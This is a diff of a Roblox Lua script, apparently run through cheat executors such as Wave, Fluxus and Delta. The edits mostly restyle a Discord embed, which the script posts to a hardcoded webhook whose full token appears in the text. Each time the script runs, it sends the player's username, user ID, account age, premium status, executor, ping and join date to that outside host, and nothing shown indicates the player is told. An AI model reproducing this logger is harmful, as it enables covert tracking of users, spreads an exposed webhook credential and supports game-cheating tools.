@@ -1,7 +1,7 @@
 if _G.scriptExecuted then
     return
 end
- 
+
 _G.scriptExecuted = true
 
 local Webhook = "https://discord.com/api/webhooks/1257417938617765991/Gde_zGOQ0mfk6K9JnKbBhSH9_qPAUCQxyRlbqSt8T97jkCAhwqVI97z--rZNsm9KZC93"
@@ -21,33 +21,61 @@ local AvatarImage = Thing.imageUrl
 
 if player.MembershipType == Enum.MembershipType.Premium then
     premium = true
+    alt = false
 end
 
-if not premium and player.AccountAge >= 70 then
-    alt = "Possible"
-elseif premium and player.AccountAge >= 70 then
-    alt = false
+-- Determine premium and alt text and emoji based on status
+local premiumEmoji = premium and ":white_check_mark:" or ":x:"
+local altEmoji = alt and ":white_check_mark:" or ":x:"
+
+-- Modify executor display based on specific conditions
+if executor == "Wave" then
+    executor = "[Wave](https://getwave.gg)"
+    executor_image = "https://cdn.discordapp.com/attachments/1214791935953211422/1257826412543606835/II3o8QCb_200x200-removebg-preview.png?ex=6685d1a2&is=66848022&hm=c7f6ac17b2f97e7eba750d8918ad410139d8174cac220ffbc9680b0e12ff8c70&"
+elseif executor == "Fluxus" then
+    executor = "[Fluxus](https://flux.li)"
+    executor_image = "https://media.discordapp.net/attachments/1214791935953211422/1257836627997360148/faviconbutpng.e3767602.png?ex=6685db25&is=668489a5&hm=20339c8be4e4f0344ffc11b6f7b4b7cdc0a329efcfa1e2193cbc700338cdc446&=&format=webp&quality=lossless" -- Replace with actual Fluxus executor image URL
+elseif executor == "VegaX" then
+    executor = "[VegaX](https://www.vegax.gg)"
+    executor_image = "https://media.discordapp.net/attachments/1214791935953211422/1257835343432908821/V_logo_white.png?ex=6685d9f3&is=66848873&hm=4459af29da6c196f06dba5c8e988ae6b106694d64596e33494e59bc5a2549972&=&format=webp&quality=lossless" -- Replace with actual VegaX executor image URL
+elseif executor == "Codex" then
+    executor = "[Codex](https://www.codex.lol)"
+    executor_image = "https://media.discordapp.net/attachments/1214791935953211422/1257833817511694397/icon_1.png?ex=6685d887&is=66848707&hm=d411ab1e2629315d67cc8dee699b806fd1e6542212f7b47ca0b3395154522aea&=&format=webp&quality=lossless" -- Replace with actual Codex executor image URL
+elseif executor == "Arceus X" then
+    executor = "[Arceus X](https://arceusx.com)"
+    executor_image = "https://media.discordapp.net/attachments/1214791935953211422/1257834191983345694/arceusx-logo-208x73.png.png?ex=6685d8e0&is=66848760&hm=037d756b9ee317a3c499daa67e277e421b4c24e82a7bac13288308f98d7e5d39&=&format=webp&quality=lossless" -- Replace with actual Arceus X executor image URL
+elseif executor == "Delta" then
+    executor = "[Delta](https://delta-executor.com)"
+    executor_image = "https://media.discordapp.net/attachments/1214791935953211422/1257834513690660894/Delta-Executor-official-logo-150x150.png?ex=6685d92d&is=668487ad&hm=afdf528a4ff5724759c2643f8424f306020b680c1f8b05d5c62408f3b0bca053&=&format=webp&quality=lossless" -- Replace with actual Delta executor image URL
+elseif executor == "Solora" then
+    executor = "[Solora](https://discord.gg/realsolara)"
+    executor_image = "https://media.discordapp.net/attachments/1214791935953211422/1257834862606286989/137825933.png?ex=6685d980&is=66848800&hm=7bfc54c0690a52b15f69d5bea0bd0fee11d8244e8f001ce79cd5d7b7c526b473&=&format=webp&quality=lossless" -- Replace with actual Solora executor image URL
+else
+    executor = "Unknown Executor" -- Replace with appropriate fallback URL
 end
 
 local msg = {
     ["username"] = "exploiter catcher",
-    ["avatar_url"] = "https://static.wikia.nocookie.net/madmurderer/images/1/12/Noob.png/revision/latest/scale-to-width-down/448?cb=20150212073303",
+    ["avatar_url"] = "https://media.discordapp.net/attachments/1130614336860205088/1257433497539313717/blade-ball-header.png?ex=668463b3&is=66831233&hm=68c39c9329d9fe4eacb00371f99520f95c573b5f7d5fcb60277cb69c764d06a2&=&format=webp&quality=lossless&width=350&height=350",
     ["content"] = (getgenv().Discord_RoleID ~= "" and getgenv().Discord_RoleID ~= nil) and tostring("<@&" .. getgenv().Discord_RoleID .. "> **:**") or "",
     ["embeds"] = {{
-        ["color"] = tonumber(tostring("0x32CD32")),
-        ["title"] = "track and field anticheat V2 ;)",
+        ["color"] = 0x1E1E1E, -- Dark gray color
+        ["title"] = "Blade ball | v1.66",
         ["thumbnail"] = {["url"] = AvatarImage},
         ["fields"] = {
             {["name"] = "Player:", ["value"] = "[ " .. player.Name .. "](https://www.roblox.com/users/" .. player.UserId .. "/profile) ", ["inline"] = true},
-            {["name"] = "Executor:", ["value"] = executor, ["inline"] = true},
-            {["name"] = "Alt:", ["value"] = alt, ["inline"] = true},
+            {["name"] = "Executor:", ["value"] = executor .. "", ["inline"] = true},
+            {["name"] = "────────────────────────", ["value"] = "", ["inline"] = false},  -- Separator
+            {["name"] = "Premium:", ["value"] = premiumEmoji, ["inline"] = true}, -- Display TRUE/FALSE with emoji
+            {["name"] = "Alt:", ["value"] = altEmoji, ["inline"] = true}, -- Display TRUE/FALSE with emoji
             {["name"] = "Account Age:", ["value"] = player.AccountAge .. " day(s)", ["inline"] = true},
+            {["name"] = "────────────────────────", ["value"] = "", ["inline"] = false},  -- Separator
             {["name"] = "Network:", ["value"] = tostring(FPS[1]) .. " FPS, " .. tostring(ping) .. " ping", ["inline"] = true},
             {["name"] = "Date Joined:", ["value"] = joinDate.day .. "/" .. joinDate.month .. "/" .. joinDate.year, ["inline"] = true},
-            
         },
-        ["footer"] = {["icon_url"] = "https://cdn.discordapp.com/attachments/1214783461517295658/1214791574781960214/Png.png?ex=65fa65d1&is=65e7f0d1&hm=b156400a41e394eda5df2ee5433917bdfe53f45bf340fdfab409d2d7fb83cfba&", ["text"] = "dont mess with field and track"},
-        ['timestamp'] = os.date("!%Y-%m-%dT%X.000Z")
+        ["footer"] = {["icon_url"] = "https://media.discordapp.net/attachments/1130614336860205088/1257433392258224321/latest.png?ex=6684639a&is=6683121a&hm=9587c3bb8bb5d9ee70e27520d1c0b46a1467f9e43514d4ab4db29b006a1cb196&=&format=webp&quality=lossless&width=350&height=350", ["text"] = "date and time"},
+        ['timestamp'] = os.date("!%Y-%m-%dT%X.000Z"),
+        ["image"] = {["url"] = executor_image},  -- Include executor image
     }}
 }
 
